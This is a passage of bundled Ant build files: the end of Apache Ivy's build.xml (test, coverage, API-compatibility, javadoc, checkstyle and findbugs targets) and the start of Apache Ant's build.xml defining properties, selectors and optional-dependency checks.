        <mkdir dir="${basedir}/test/jar-repos"/>
        <jar destfile="${basedir}/test/jar-repos/jarrepo1.jar" >
            <fileset dir="${basedir}/test/repositories/1"/>
        </jar>
        <jar destfile="${basedir}/test/jar-repos/jarrepo1_subdir.jar">
            <fileset dir="${basedir}/test/repositories" includes="1/**/*"/>
        </jar>
    </target>

    <target name="init-jacoco" depends="jar" unless="skip.test">
        <ivy:cachepath organisation="org.jacoco" module="org.jacoco.ant" revision="${jacoco.version}"
                       inline="true" conf="default" pathid="jacoco.classpath" log="download-only"/>
        <taskdef uri="antlib:org.jacoco.ant" resource="org/jacoco/ant/antlib.xml"
                 classpathref="jacoco.classpath"/>
    </target>

    <target name="test-internal" depends="build-test,init-tests,prepare-osgi-tests,prepare-test-jar-repositories,init-jacoco" unless="skip.test">
        <mkdir dir="${test.xml.dir}"/>

        <!-- multiple runs into the same logfile let the later report generation fail -->
        <delete file="${jacoco.log}"/>
        <property name="jacoco.coverage.enabled" value="true"/>
        <jacoco:coverage xmlns:jacoco="antlib:org.jacoco.ant" destfile="${jacoco.log}"
                         exclclassloader="sun.reflect.DelegatingClassLoader:javassist.Loader"
                         enabled="${jacoco.coverage.enabled}">
            <junit
                haltonfailure="off"
                haltonerror="off"
                errorproperty="test.failed"
                failureproperty="test.failed"
                showoutput="no"
                printsummary="yes"
                includeantruntime="no"
                dir="${basedir}"
                tempdir="${build.dir}"
                fork="true">
                <classpath>
                    <path refid="test.classpath"/>
                </classpath>

                <!-- pass the proxy properties to the forked junit process to use correct proxy -->
                <syspropertyset>
                    <propertyref prefix="http"/>
                </syspropertyset>

                <!-- Added this to test IVY-65 -->
                <jvmarg value="-Duser.region=TR"/>
                <jvmarg value="-Duser.language=tr"/>

                <formatter type="xml"/>
                <batchtest todir="${test.xml.dir}">
                    <fileset refid="test.fileset"/>
                </batchtest>
            </junit>
        </jacoco:coverage>
    </target>

    <target name="test" depends="test-internal" description="Run the test">
        <fail if="test.failed"
              message="At least one test has failed. See logs (in ${test.xml.dir}) for details (use the target test-report to run the test with a report)"/>
    </target>

    <!-- =================================================================
         REPORTS AND DOCUMENTATION
         ================================================================= -->
    <target name="test-report" depends="test-internal" unless="skip.test"
            description="run tests with instrumentation and generate coverage report">
        <junitreport todir="${test.xml.dir}">
            <fileset dir="${test.xml.dir}">
                <include name="TEST-*.xml"/>
            </fileset>
            <report format="frames" todir="${test.report.dir}"/>
        </junitreport>

        <mkdir dir="${coverage.report.dir}"/>
        <jacoco:report xmlns:jacoco="antlib:org.jacoco.ant">
            <executiondata>
                <file file="${jacoco.log}"/>
            </executiondata>

            <structure name="Ivy">
                <classfiles>
                    <fileset dir="${classes.build.dir}"/>
                </classfiles>
                <sourcefiles encoding="UTF-8">
                    <fileset dir="${src.dir}"/>
                </sourcefiles>
            </structure>

            <html destdir="${coverage.report.dir}"/>
        </jacoco:report>

        <fail if="test.failed"
              message="At least one test has failed. See logs (in ${test.xml.dir}) or report (in ${test.report.dir})"/>
    </target>

    <target name="coverage-report" depends="test-report"/>

    <target name="ivy-report" depends="resolve">
        <mkdir dir="${ivy.report.dir}"/>
        <ivy:report todir="${ivy.report.dir}"/>
    </target>

    <target name="init-japicmp" depends="jar" unless="skip.test">
        <ivy:cachepath organisation="com.github.siom79.japicmp" module="japicmp-ant-task" revision="0.13.0"
                       inline="true" conf="default" pathid="japicmp.classpath" log="download-only"/>
        <taskdef uri="antlib:japicmp.ant" resource="japicmp/ant/antlib.xml"
                 classpathref="japicmp.classpath"/>
        <ivy:cachepath organisation="org.apache.ivy" module="ivy" revision="${ivy.api.reference}"
                       inline="true" conf="optional" pathid="ivyrefdeps.classpath" log="download-only"/>
        <ivy:cachefileset organisation="org.apache.ivy" module="ivy" revision="${ivy.api.reference}"
                          inline="true" conf="master" setid="ivyref.fileset" log="download-only"/>
        <pathconvert property="ivyref.name" refid="ivyref.fileset"/>
    </target>

    <target name="/japicmp-all" description="report status of all public APIs">
        <property name="japicmp.all" value="true"/>
    </target>

    <target name="/japicmp-changed" description="report all changed public APIs">
        <property name="japicmp.changed" value="true"/>
    </target>

    <target name="japicmp" depends="init-japicmp" unless="skip.test">
        <property name="japicmp.all" value="false"/>
        <property name="japicmp.changed" value="false"/>
        <condition property="japicmp.binary" value="true" else="false">
            <not>
                <or>
                    <istrue value="${japicmp.all}"/>
                    <istrue value="${japicmp.changed}"/>
                </or>
            </not>
        </condition>
        <japicmp:japicmp xmlns:japicmp="antlib:japicmp.ant"
                         oldjar="${ivyref.name}"
                         newjar="${artifacts.build.dir}/jars/${final.name}"
                         oldclasspathref="ivyrefdeps.classpath"
                         newclasspathref="lib.classpath"
                         onlybinaryincompatible="${japicmp.binary}"
                         onlymodified="${japicmp.changed}"
                         htmloutputfile="${reports.dir}/japicmp.html"/>
    </target>

    <target name="javadoc" depends="init" unless="skip.javadoc">
        <tstamp>
            <format pattern="2007-yyyy" property="years"/>
        </tstamp>
        <property name="copyright" value="Copyright &amp;copy;${years} The Apache Software Foundation, Licensed under &lt;a href=&quot;https://www.apache.org/licenses/LICENSE-2.0.txt&quot;&gt;Apache License, Version 2.0&lt;/a&gt;."/>
        <property name="title" value="Apache Ivy&amp;trade; dependency manager ${target.ivy.version} API"/>
        <javadoc destdir="${javadoc.build.dir}"
                 useexternalfile="true"
                 windowtitle="Apache Ivy&amp;trade;"
                 doctitle="${title}"
                 bottom="${copyright}"
                 classpathref="lib.classpath">
            <fileset dir="${src.dir}" includes="**/*.java"/>
            <arg value="-tag"/>
            <arg value="pre:a:Precondition:"/>
        </javadoc>
    </target>

    <target name="javadoc-test" depends="init" unless="skip.javadoc">
        <tstamp>
            <format pattern="2007-yyyy" property="years"/>
        </tstamp>
        <property name="copyright" value="Copyright &amp;copy;${years} The Apache Software Foundation, Licensed under &lt;a href=&quot;https://www.apache.org/licenses/LICENSE-2.0.txt&quot;&gt;Apache License, Version 2.0&lt;/a&gt;."/>
        <property name="title" value="Apache Ivy&amp;trade; dependency manager ${target.ivy.version} API"/>
        <javadoc destdir="${test.javadoc.build.dir}"
                 useexternalfile="true"
                 windowtitle="Apache Ivy&amp;trade;"
                 doctitle="${title}"
                 bottom="${copyright}"
                 classpathref="javadoc.test.classpath">
            <fileset dir="${test.dir}" includes="**/*.java"/>
        </javadoc>
    </target>

    <target name="init-checkstyle" depends="jar">
        <ivy:cachepath organisation="com.puppycrawl.tools" module="checkstyle" revision="6.19"
                       inline="true" conf="default" pathid="checkstyle.classpath" log="download-only"/>
        <taskdef uri="antlib:com.puppycrawl.tools.checkstyle.ant"
                 resource="com/puppycrawl/tools/checkstyle/ant/antlib.xml" classpathref="checkstyle.classpath"/>
    </target>

    <!-- Checks Ivy codebase according to ${checkstyle.src.dir}/checkstyle-config  -->
    <target name="checkstyle-internal" depends="init-checkstyle">
        <mkdir dir="${checkstyle.report.dir}"/>
        <cs:checkstyle xmlns:cs="antlib:com.puppycrawl.tools.checkstyle.ant"
                       config="${checkstyle.src.dir}/checkstyle-config"
                       failOnViolation="false" failureProperty="checkstyle.failed">
            <classpath>
                <path refid="run.classpath"/>
            </classpath>
            <formatter type="xml" toFile="${checkstyle.report.dir}/checkstyle.xml"/>
            <fileset dir="${src.dir}">
                <include name="**/*.java"/>
            </fileset>
            <fileset dir="${example.dir}">
                <include name="**/*.java"/>
            </fileset>
        </cs:checkstyle>
    </target>

    <target name="checkstyle" depends="checkstyle-internal"
            description="checks Ivy codebase according to ${checkstyle.src.dir}/checkstyle-config">
        <fail if="checkstyle.failed" unless="ignore.checkstyle"
              message="Checkstyle has errors. See report in ${checkstyle.report.dir}"/>
    </target>

    <target name="checkstyle-report" depends="checkstyle-internal">
        <property name="checkstyle.basedir" location="${src.dir}"/>
        <xslt in="${checkstyle.report.dir}/checkstyle.xml"
              style="${checkstyle.src.dir}/checkstyle-frames.xsl"
              out="${checkstyle.report.dir}/output.txt">
            <param name="basedir" expression="${checkstyle.basedir}"/>
            <param name="output.dir" expression="${checkstyle.report.dir}"/>
        </xslt>
    </target>

    <target name="init-findbugs" unless="findbugs.home">
        <!-- Findbugs: Getting Findbugs requires unlimited strength crypto policy -->
        <property name="findbugs.version"
                  value="3.0.1"
                  description="Version of Findbugs to use"/>
        <property name="findbugs.download.name"
                  value="findbugs-${findbugs.version}"
                  description="Name of the download file without suffix. Also the internal root directory of the ZIP."/>
        <property name="findbugs.download.file"
                  value="${findbugs.download.name}.zip"
                  description="The filename of the ZIP."/>
        <property name="findbugs.download.url"
                  value="https://downloads.sourceforge.net/project/findbugs/findbugs/${findbugs.version}/findbugs-${findbugs.version}.zip"
                  description="The download adress at a mirror of Sourceforge."/>
        <property name="findbugs.download.to"
                  value="${build.dir}/.downloads"
                  description="Where to store the download and 'install' Findbugs."/>
        <available property="findbugs.home"
                   value="${findbugs.download.to}/${findbugs.download.name}"
                   file="${findbugs.download.to}/${findbugs.download.name}/lib/findbugs.jar"
                   description="Check if Findbugs is already installed."/>

        <!-- Findbugs: Running Findbugs -->
        <property name="findbugs.reportdir"
                  location="${reports.dir}/findbugs"
                  description="Where to store Findbugs results"/>
        <property name="findbugs.raw"
                  value="raw.xml"
                  description="Findbugs output xml file"/>
        <property name="findbugs.xsl"
                  value="fancy.xsl"
                  description="Which XSL to use for generating output: default, fancy, plain, summary"/>
        <property name="findbugs.jvmargs"
                  value="-Xms128m -Xmx512m"
                  description="JVMArgs for invoking Findbugs"/>

        <mkdir dir="${findbugs.download.to}"/>
        <get src="${findbugs.download.url}" dest="${findbugs.download.to}/${findbugs.download.file}"
             usetimestamp="true" skipexisting="true"/>
        <unzip src="${findbugs.download.to}/${findbugs.download.file}" dest="${findbugs.download.to}"/>
        <property name="findbugs.home" location="${findbugs.download.to}/${findbugs.download.name}"/>
    </target>

    <target name="findbugs" description="checks Ivy codebase with Findbugs" depends="init-findbugs,compile-core" xmlns:fb="http://findbugs.sourceforge.net/">
        <!-- Load the Findbugs AntTasks -->
        <path id="findbugs.real.classpath">
            <fileset dir="${findbugs.home}/lib" includes="*.jar"/>
        </path>
        <taskdef uri="http://findbugs.sourceforge.net/" resource="edu/umd/cs/findbugs/anttask/tasks.properties" classpathref="findbugs.real.classpath"/>

        <!-- Start Findbugs -->
        <mkdir dir="${findbugs.reportdir}"/>
        <fb:findbugs home="${findbugs.home}"
                     classpathref="findbugs.real.classpath"
                     output="xml:withMessages"
                     outputFile="${findbugs.reportdir}/${findbugs.raw}"
                     jvmargs="${findbugs.jvmargs}"
                     projectName="${ant.project.name} ${target.ivy.version}">
            <class location="${core.classes.build.dir}"/>
            <sourcePath path="${src.dir}"/>
        </fb:findbugs>

        <!-- Generate (human) readable output -->
        <xslt basedir="${findbugs.reportdir}" includes="${findbugs.raw}" destdir="${findbugs.reportdir}">
            <style>
                <javaresource name="${findbugs.xsl}" classpathref="findbugs.real.classpath"/>
            </style>
        </xslt>
    </target>

    <target name="docs" depends="test-report,checkstyle-report,findbugs,japicmp,ivy-report,javadoc"/>

    <!-- =================================================================
         IDE SPECIFIC
         ================================================================= -->
    <available file="${basedir}/.classpath" property="eclipse.classpath.exists"/>
    <target name="check-eclipse-classpath-overwrite" if="eclipse.classpath.exists">
        <input message=".classpath file already exists.${line.separator}Are you sure you want to overwrite it and loose your original file?"
               validargs="Y,N,y,n" addproperty="eclipse.classpath.confirm"/>
        <condition property="eclipse.classpath.abort">
            <equals arg1="${eclipse.classpath.confirm}" arg2="N" casesensitive="false"/>
        </condition>
    </target>

    <target name="eclipse-default" depends="resolve,check-eclipse-classpath-overwrite"
            unless="eclipse.classpath.abort"
            description="creates a default .classpath for Eclipse using jars resolved by this Ant build">
        <copy file="${basedir}/.classpath.default" tofile="${basedir}/.classpath" overwrite="true"/>
    </target>

    <target name="eclipse-ivyde" depends="check-eclipse-classpath-overwrite"
            unless="eclipse.classpath.abort"
            description="creates a .classpath for Eclipse using Apache IvyDE plugin">
        <copy file="${basedir}/.classpath.ivyde" tofile="${basedir}/.classpath" overwrite="true"/>
    </target>
</project>
</file>

<file path="sample_data/test_files/small/ant/apache-ant-build.xml">
<?xml version="1.0"?>

<!--
   Licensed to the Apache Software Foundation (ASF) under one or more
   contributor license agreements.  See the NOTICE file distributed with
   this work for additional information regarding copyright ownership.
   The ASF licenses this file to You under the Apache License, Version 2.0
   (the "License"); you may not use this file except in compliance with
   the License.  You may obtain a copy of the License at

       https://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.
-->
<project name="apache-ant" default="main" basedir=".">

  <!-- Give user a chance to override without editing this file
       (and without typing -D on each invocation) -->
  <property file=".ant.properties"/>
  <property file="${user.home}/.ant.properties"/>
  <property environment="env"/>

  <!--
       ===================================================================
         Set the properties that control names and versions
       ===================================================================
  -->
  <property name="Name" value="Apache Ant"/>
  <property name="name" value="ant"/>
  <!-- this is the directory corresponding to groupId of Ant in the Maven repository -->
  <property name="groupid" value="org/apache/ant"/>
  <property name="project.version" value="1.10.16alpha"/>
  <!-- pom.version is used when doing a distribution and must match with what is checked in under src/etc/poms -->
  <property name="pom.version" value="1.10.16-SNAPSHOT"/>
  <property name="manifest-version" value="1.10.16"/>
  <property name="bootstrap.jar" value="ant-bootstrap.jar"/>

  <property name="ant.package" value="org/apache/tools/ant"/>
  <property name="taskdefs.package" value="${ant.package}/taskdefs"/>
  <property name="condition.package" value="${taskdefs.package}/condition"/>
  <property name="modules.package" value="${taskdefs.package}/modules"/>
  <property name="optional.package" value="${taskdefs.package}/optional"/>
  <property name="type.package" value="${ant.package}/types"/>
  <property name="optional.type.package" value="${type.package}/optional"/>
  <property name="apache.resolver.type.package" value="${type.package}/resolver"/>
  <property name="util.package" value="${ant.package}/util"/>
  <property name="regexp.package" value="${util.package}/regexp"/>

  <property name="optional.jars.prefix" value="ant"/>
  <property name="optional.jars.whenmanifestonly" value="skip"/>

  <!--
       ===================================================================
         Set the properties related to the source tree
       ===================================================================
  -->
  <property name="src.dir" value="src"/>
  <property name="java.dir" value="${src.dir}/main"/>
  <property name="script.dir" value="${src.dir}/script"/>
  <property name="resource.dir" value="${src.dir}/resources"/>
  <property name="src.junit" value="${src.dir}/tests/junit"/>
  <property name="src.antunit" value="${src.dir}/tests/antunit"/>
  <property name="etc.dir" value="${src.dir}/etc"/>
  <property name="tests.etc.dir" value="${etc.dir}/testcases"/>
  <property name="lib.dir" value="lib"/>
  <property name="manual.dir" value="manual"/>

  <!--
       ===================================================================
         Set the properties for the build area
       ===================================================================
  -->
  <property name="build.dir" value="build"/>
  <property name="bootstrap.dir" location="bootstrap"/>
  <property name="build.classes" value="${build.dir}/classes"/>
  <property name="build.lib" value="${build.dir}/lib"/>
  <property name="build.lib-src" value="${build.dir}/lib-src"/>
  <property name="build.javadocs" value="${build.dir}/javadocs"/>
  <property name="build.tests" value="${build.dir}/testcases"/>
  <property name="build.tests.javadocs" value="${build.dir}/javadocs.test/"/>
  <property name="build.junit.xml" location="${build.tests}/xml"/>
  <property name="build.junit.tmpdir" location="${build.tests}/tmp"/>
  <property name="build.junit.reports" location="${build.tests}/reports"/>
  <property name="build.pkg.dir" value="${build.dir}/pkg"/>
  <property name="antunit.xml" location="${build.dir}/antunit/xml"/>
  <property name="antunit.tmpdir" location="${build.dir}/antunit/tmp"/>
  <property name="antunit.reports" location="${build.dir}/antunit/reports"/>
  <property name="antunit.loglevel" value="none"/>
  <!-- the absolute path -->
  <property name="build.classes.value" location="${build.classes}"/>
  <property name="build.tests.value" location="${build.tests}"/>

  <!--
       ===================================================================
         Set the properties that control various build options
       ===================================================================
  -->
  <property name="debug" value="true"/>
  <property name="setpermissions.fail" value="true"/>
  <property name="setpermissions.nonposixmode" value="tryDosOrPass"/>
  <property name="deprecation" value="false"/>
  <property name="optimize" value="true"/>
  <property name="javac.target" value="1.8"/>
  <property name="javac.source" value="1.8"/>
  <property name="javac.release" value="8"/>
  <property name="junit.filtertrace" value="off"/>
  <property name="junit.summary" value="no"/>
  <property name="test.haltonfailure" value="false"/>
  <property name="junit.fork" value="true"/>
  <property name="junit.forkmode" value="once"/>
  <condition property="junit.threads" value="2" else="0">
    <and>
      <equals arg1="${junit.fork}" arg2="true"/>
      <equals arg1="${junit.forkmode}" arg2="perTest"/>
    </and>
  </condition>
  <property name="expandproperty.files"
            value="**/version.txt,**/defaultManifest.mf"/>
  <property name="junit.collector.dir" value="${build.dir}/failingTests"/>
  <property name="junit.collector.class" value="FailedTests"/>

  <!--
       ===================================================================
         Set the paths used in the build
       ===================================================================
  -->
  <path id="classpath">
    <fileset dir="lib/optional" includes="*.jar"/>
  </path>

  <path id="tests-classpath">
    <pathelement location="${build.classes}"/>
    <path refid="classpath"/>
  </path>
  <path id="tests-runtime-classpath">
    <path refid="tests-classpath"/>
    <pathelement location="${build.tests}"/>
    <!--
        include the test source and test data dirs
        so that we can pick resources via getResource(AsStream)
     -->
    <pathelement location="${src.junit}"/>
    <pathelement location="${tests.etc.dir}"/>
    <!-- Otherwise many tests fail with "com.sun.tools.javac.Main is not on the classpath.": -->
    <pathelement location="${java.home}/../lib/tools.jar"/>
  </path>

  <!--
        ===================================================================
          Set up properties for the distribution area
        ===================================================================
   -->
  <property name="dist.name" value="apache-${name}-${project.version}"/>
  <property name="dist.base" value="distribution"/>
  <property name="dist.base.source" value="${dist.base}/source"/>
  <property name="dist.base.binaries" value="${dist.base}/binaries"/>
  <property name="dist.base.manual" value="${dist.base}/manual"/>
  <property name="dist.dir" location="dist"/>
  <property name="dist.bin" value="${dist.dir}/bin"/>
  <property name="dist.lib" value="${dist.dir}/lib"/>
  <property name="dist.manual" value="${dist.dir}/manual"/>
  <property name="dist.etc" value="${dist.dir}/etc"/>
  <property name="dist.javadocs" value="${dist.dir}/manual/api"/>

  <property name="src.dist.dir" value="dist-src"/>
  <property name="src.dist.src" value="${src.dist.dir}/src"/>
  <property name="src.dist.manual" value="${src.dist.dir}/manual"/>
  <property name="src.dist.lib" value="${src.dist.dir}/lib"/>

  <property name="java-repository.dir" value="java-repository/${groupid}"/>

  <!--
       ===================================================================
         Set up selectors to be used by javac, junit and jar to exclude
         files that have dependencies that are not available
       ===================================================================
  -->

  <selector id="needs.jdk9+">
    <filename name="${modules.package}/"/>
  </selector>

  <!-- Kaffe has some JDK 1.5 features including java.lang.Readable,
       but not all of them -->
  <selector id="not.in.kaffe">
    <or>
      <filename name="${condition.package}/IsReachable*"/>
    </or>
  </selector>

  <selector id="needs.apache-resolver">
    <filename name="${apache.resolver.type.package}/"/>
  </selector>

  <selector id="needs.junit">
    <and>
      <filename name="${optional.package}/junit/"/>
      <not>
          <or>
            <filename name="${optional.package}/junit/JUnit4TestMethodAdapter*"/>
            <filename name="${optional.package}/junit/CustomJUnit4TestAdapterCache*"/>
          </or>
      </not>
    </and>
  </selector>

  <selector id="needs.junit4">
      <or>
         <filename name="${optional.package}/junit/JUnit4TestMethodAdapter*"/>
         <filename name="${optional.package}/junit/CustomJUnit4TestAdapterCache*"/>
      </or>
  </selector>

  <selector id="needs.junitlauncher">
    <or>
      <filename name="${optional.package}/junitlauncher/"/>
      <filename name="org/example/junitlauncher/Tracker.java"/>
    </or>
  </selector>

  <selector id="needs.junit.engine.vintage">
    <or>
      <!-- we need JUnit vintage engine only in tests where we test the junitlauncher task -->
      <filename name="${optional.package}/junitlauncher/**/JUnitLauncherTaskTest.java"/>
      <filename name="org/example/junitlauncher/vintage/**/*"/>
    </or>
  </selector>

  <selector id="needs.junit.engine.jupiter">
    <or>
      <!-- we need JUnit jupiter engine only in tests where we test the junitlauncher task -->
      <filename name="${optional.package}/junitlauncher/**/JUnitLauncherTaskTest.java"/>
      <filename name="${optional.package}/junitlauncher/OutputDirLocationTest.java"/>
      <filename name="org/example/junitlauncher/jupiter/**/*"/>
    </or>
  </selector>

  <selector id="needs.apache-regexp">
    <filename name="${regexp.package}/JakartaRegexp*"/>
  </selector>

  <selector id="needs.apache-oro">
    <or>
      <filename name="${regexp.package}/JakartaOro*"/>
    </or>
  </selector>

  <selector id="needs.apache-bcel">
    <or>
      <filename name="${ant.package}/filters/util/JavaClassHelper*"/>
      <filename name="${util.package}/depend/bcel/"/>
      <filename name="${optional.type.package}/depend/ClassFileSetTest*"/>
    </or>
  </selector>

  <selector id="needs.apache-log4j">
    <filename name="${ant.package}/listener/Log4jListener*"/>
  </selector>

  <selector id="needs.commons-logging">
    <filename name="${ant.package}/listener/CommonsLoggingListener*"/>
  </selector>

  <selector id="needs.apache-bsf">
    <or>
      <filename name="${util.package}/ScriptRunner.*"/>
      <filename name="${util.package}/optional/ScriptRunner*"/>
    </or>
  </selector>

  <selector id="needs.javamail">
    <or>
      <filename name="${ant.package}/taskdefs/email/MimeMailer*"/>
    </or>
  </selector>

  <selector id="needs.jakartamail">
    <or>
      <filename name="${ant.package}/taskdefs/email/JakartaMimeMailer*"/>
    </or>
  </selector>

  <selector id="needs.netrexx">
    <filename name="${optional.package}/NetRexxC*"/>
  </selector>

  <selector id="needs.commons-net">
    <or>
      <filename name="${optional.package}/net/FTP*"/>
      <filename name="${optional.package}/net/RExec*"/>
      <filename name="${optional.package}/net/TelnetTask*"/>
    </or>
  </selector>

  <selector id="needs.antlr">
    <filename name="${optional.package}/ANTLR*"/>
  </selector>

  <selector id="needs.imageio">
    <or>
      <filename name="${optional.package}/image/ImageIO*"/>
      <filename name="${optional.type.package}/imageio/"/>
    </or>
  </selector>

  <selector id="needs.jmf">
    <filename name="${optional.package}/sound/"/>
  </selector>

  <selector id="needs.jai">
    <or>
      <filename name="${optional.package}/image/Image.*"/>
      <filename name="${optional.package}/image/ImageTest.*"/>
      <filename name="${optional.type.package}/image/"/>
    </or>
  </selector>

  <selector id="needs.jdepend">
    <filename name="${optional.package}/jdepend/"/>
  </selector>

  <selector id="needs.swing">
    <filename name="${optional.package}/splash/"/>
  </selector>

  <selector id="needs.jsch">
    <filename name="${optional.package}/ssh/"/>
  </selector>

  <!-- needs TraceListenerEx3 interface implemented by PrintTraceListener -->
  <selector id="needs.apache-xalan2">
    <filename name="${optional.package}/Xalan2TraceSupport*"/>
  </selector>

  <selector id="needs.xz">
    <or>
      <filename name="${optional.package}/xz/"/>
      <filename name="${type.package}/optional/xz/"/>
    </or>
  </selector>

  <selector id="needs.graaljs">
    <filename name="${optional.package}/script/graal/*"/>
  </selector>

  <selector id="ant.launcher">
    <filename name="${ant.package}/launch/"/>
  </selector>

  <selector id="ant.core">
    <not>
      <or>
        <selector refid="needs.antlr"/>
        <selector refid="needs.apache-bcel"/>
        <selector refid="needs.apache-bsf"/>
        <selector refid="needs.apache-log4j"/>
        <selector refid="needs.apache-oro"/>
        <selector refid="needs.apache-regexp"/>
        <selector refid="needs.apache-resolver"/>
        <selector refid="needs.apache-xalan2"/>
        <selector refid="needs.commons-logging"/>
        <selector refid="needs.commons-net"/>
        <selector refid="needs.imageio"/>
        <selector refid="needs.jai"/>
        <selector refid="needs.javamail"/>
        <selector refid="needs.jakartamail"/>
        <selector refid="needs.jdepend"/>
        <selector refid="needs.jmf"/>
        <selector refid="needs.jsch"/>
        <selector refid="needs.junit"/>
        <selector refid="needs.junit4"/>
        <selector refid="needs.junitlauncher"/>
        <selector refid="needs.netrexx"/>
        <selector refid="needs.swing"/>
        <selector refid="needs.xz"/>
        <selector refid="ant.launcher"/>
      </or>
    </not>
  </selector>

  <patternset id="onlinetests">
    <exclude name="**/GetTest.java" if="offline"/>
    <exclude name="**/HttpTest.java" if="offline"/>
  </patternset>

  <patternset id="teststhatfail">
    <!-- Property 'run.failing.tests' should force Ant to run these tests. -->
    <!-- Because the whole patternset can not be excluded, you have to add -->
    <!-- an unless-attribute on each exclude-element.                      -->
    <exclude unless="run.failing.tests" name="${optional.package}/BeanShellScriptTest.java"/>
    <exclude unless="run.failing.tests" name="${optional.package}/jdepend/JDependTest.java"/>
  </patternset>

  <!-- tests that need an XML Schema-supporting parser to work -->
  <selector id="needs.xmlschema">
    <or>
      <filename name="${optional.package}/SchemaValidateTest.*"/>
      <filename name="${optional.package}/XmlValidateTest.*"/>
    </or>
  </selector>

  <!--
       ===================================================================
         Set up a patternsets that matches the parts of our JUnit testsuite
         that may be useful for task developers.
       ===================================================================
  -->
  <patternset id="useful.tests">
    <include name="${ant.package}/AntAssert*"/>
    <include name="${ant.package}/BuildFileTest*"/>
    <include name="${ant.package}/BuildFileRule*"/>
    <include name="${ant.package}/FileUtilities*"/>
    <include name="${ant.package}/MagicTestNames*"/>
    <include name="${regexp.package}/RegexpMatcherTest*"/>
    <include name="${regexp.package}/RegexpTest*"/>
    <include name="${optional.package}/AbstractXSLTLiaisonTest*"/>
    <include name="${ant.package}/types/AbstractFileSetTest*"/>
  </patternset>

  <!--
       ===================================================================
         Check to see what optional dependencies are available
       ===================================================================
  -->
  <target name="check-optional-packages">
    <condition property="ignoresystemclasses">
      <not>
        <equals arg1="${build.sysclasspath}" arg2="only"/>
      </not>
    </condition>
    <property name="ignoresystemclasses" value="false"/>
    <available property="jdk9+" classname="java.lang.module.ModuleDescriptor"/>
    <condition property="jdk10+">
      <javaversion atleast="10"/>
    </condition>
    <available property="kaffe" classname="kaffe.util.NotImplemented"/>
    <available property="harmony"
               classname="org.apache.harmony.luni.util.Base64"/>
    <available property="bsf.present"
               classname="org.apache.bsf.BSFManager"
               classpathref="classpath" ignoresystemclasses="${ignoresystemclasses}"/>
    <available property="netrexx.present"
               classname="netrexx.lang.Rexx"
               classpathref="classpath" ignoresystemclasses="${ignoresystemclasses}"/>
    <available property="apache.resolver.present"
               classname="org.apache.xml.resolver.tools.CatalogResolver"
               classpathref="classpath" ignoresystemclasses="${ignoresystemclasses}"/>
    <available property="recent.xalan2.present"
               classname="org.apache.xalan.trace.TraceListenerEx3"
               classpathref="classpath" ignoresystemclasses="${ignoresystemclasses}"/>
    <available property="junit.present"
               classname="junit.framework.TestCase"
               classpathref="classpath" ignoresystemclasses="${ignoresystemclasses}"/>
    <available property="junit4.present"
               classname="org.junit.Test"
               classpathref="classpath" ignoresystemclasses="${ignoresystemclasses}"/>
    <available property="junitlauncher.present"
               classname="org.junit.platform.launcher.Launcher"
               classpathref="classpath" ignoresystemclasses="${ignoresystemclasses}"/>
    <available property="junit.engine.vintage.present"
               classname="org.junit.vintage.engine.VintageTestEngine"
               classpathref="classpath" ignoresystemclasses="${ignoresystemclasses}"/>
    <available property="junit.engine.jupiter.present"
               classname="org.junit.jupiter.engine.JupiterTestEngine"
               classpathref="classpath" ignoresystemclasses="${ignoresystemclasses}"/>
    <available property="antunit.present"
               classname="org.apache.ant.antunit.AntUnit"
               classpathref="classpath" ignoresystemclasses="${ignoresystemclasses}"/>
    <available property="commons.net.present"
               classname="org.apache.commons.net.ftp.FTPClient"
               classpathref="classpath" ignoresystemclasses="${ignoresystemclasses}"/>
    <available property="antlr.present"
               classname="antlr.Tool"
               classpathref="classpath" ignoresystemclasses="${ignoresystemclasses}"/>
    <available property="apache.regexp.present"
               classname="org.apache.regexp.RE"
               classpathref="classpath" ignoresystemclasses="${ignoresystemclasses}"/>
    <available property="apache.oro.present"
               classname="org.apache.oro.text.regex.Perl5Matcher"
               classpathref="classpath" ignoresystemclasses="${ignoresystemclasses}"/>
    <available property="imageio.present"
               classname="javax.imageio.ImageIO"
               classpathref="classpath"/>
    <available property="jmf.present"
               classname="javax.sound.sampled.Clip"
               classpathref="classpath"/>
    <available property="jai.present"
               classname="javax.media.jai.JAI"
               classpathref="classpath" ignoresystemclasses="${ignoresystemclasses}"/>
    <available property="jdepend.present"
               classname="jdepend.framework.JDepend"
               classpathref="classpath" ignoresystemclasses="${ignoresystemclasses}"/>
    <available property="log4j.present"
               classname="org.apache.log4j.Logger"
               classpathref="classpath" ignoresystemclasses="${ignoresystemclasses}"/>
    <available property="commons.logging.present"
               classname="org.apache.commons.logging.LogFactory"
               classpathref="classpath" ignoresystemclasses="${ignoresystemclasses}"/>
    <available property="xalan.envcheck"
               classname="org.apache.xalan.xslt.EnvironmentCheck"
               classpathref="classpath" ignoresystemclasses="${ignoresystemclasses}"/>
    <available property="which.present"
               classname="org.apache.env.Which"
               classpathref="classpath" ignoresystemclasses="${ignoresystemclasses}"/>
    <available property="xerces.present"
               classname="org.apache.xerces.parsers.SAXParser"
               classpathref="classpath" ignoresystemclasses="${ignoresystemclasses}"/>
    <available property="bcel.present"
               classname="org.apache.bcel.Constants"
               classpathref="classpath" ignoresystemclasses="${ignoresystemclasses}"/>
    <available property="javamail.present"
               classname="javax.mail.Transport"
               classpathref="classpath" ignoresystemclasses="${ignoresystemclasses}"/>
    <available property="jakartamail.present"
               classname="jakarta.mail.Transport"
               classpathref="classpath" ignoresystemclasses="${ignoresystemclasses}"/>
    <available property="graaljs.present"
               classname="com.oracle.truffle.js.scriptengine.GraalJSScriptEngine"
               classpathref="classpath" ignoresystemclasses="${ignoresystemclasses}"/>

    <condition property="javaxmail.complete">
      <and>
        <available classname="javax.activation.DataHandler"/>
        <available classname="javax.mail.Transport"/>
      </and>
    </condition>
    <condition property="jakartamail.complete">
      <and>
        <available classname="jakarta.activation.DataHandler"/>
        <available classname="jakarta.mail.Transport"/>
      </and>
    </condition>
    <condition property="javamail.complete">
      <or>
        <isset property="javaxmail.complete"/>
        <isset property="jakartamail.complete"/>
      </or>
    </condition>

    <condition property="tests.and.ant.share.classloader">
      <or>
        <equals arg1="${junit.fork}" arg2="true"/>
        <equals arg1="${build.sysclasspath}" arg2="only"/>
      </or>
    </condition>

    <condition property="sun.tools.present">
      <and>
        <available classname="sun.tools.native2ascii.Main"/>
